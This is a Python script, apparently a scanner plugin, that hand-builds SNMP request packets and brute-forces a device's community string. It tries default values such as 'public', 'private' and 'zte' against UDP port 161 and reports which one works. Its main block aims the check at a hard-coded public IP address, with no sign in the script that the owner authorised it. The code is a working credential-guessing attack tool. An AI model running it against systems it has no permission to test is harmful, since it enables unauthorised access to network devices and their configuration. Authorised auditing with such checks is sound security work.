#-*-coding:utf-8-*-

import codecs
import socket

communitys = [
"public",
"private",
"firewall",
"NETMAN",
"share",
"unique",
"zte",
]


def crack_snmp(community,ip):
    data = "a51302024129020100020110300730050601000500"
    community = community.encode()
    community = b"%s%s" % (codecs.decode('%02x' % (len(community)), 'hex_codec'), community)
    data = b"\x02\x01\x01\x04%s%s" % (community, codecs.decode(data, 'hex_codec'))
    data = b"\x30%s%s" % (codecs.decode('%02x' % (len(data)), 'hex_codec'), data)
    recv_data = b""
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client.settimeout(1.5)
        client.sendto(data, (ip, 161))
        recv_data = client.recv(1024)
    except socket.timeout as e:
        return e.args[0]
    except Exception as e:
        print(e)
        pass
    check = b"\x02\x01\x01\x04%s"%(community)
    if check in recv_data and codecs.decode("050601000500", 'hex_codec') not in recv_data:
        return True
    return False

def verify(protocol,ip,port):
    if protocol == '':
        url = ip+':'+str(port)
    else:
        url = protocol+'://'+ip+':'+str(port)
    print('testing if snmp community brute vul')
    try:
        for com in communitys:
            ret = crack_snmp(com, ip)
            if ret == True:
                msg = 'Found snmap community brute force success in url:' + url + ' with community ' + com + ' .'
                print(msg)
                number = 'v101'
                return True, url, number, msg
            if ret == "timed out":
                number = 'v0'
                msg = 'Cannot find snmp community vul'
                return False,url,number,msg
            else:
                pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no snmp community vul'
    number = 'v0'
    return False, url, number, msg

if __name__ == '__main__':
    res = verify('http','183.237.147.108',161)
    print(res)

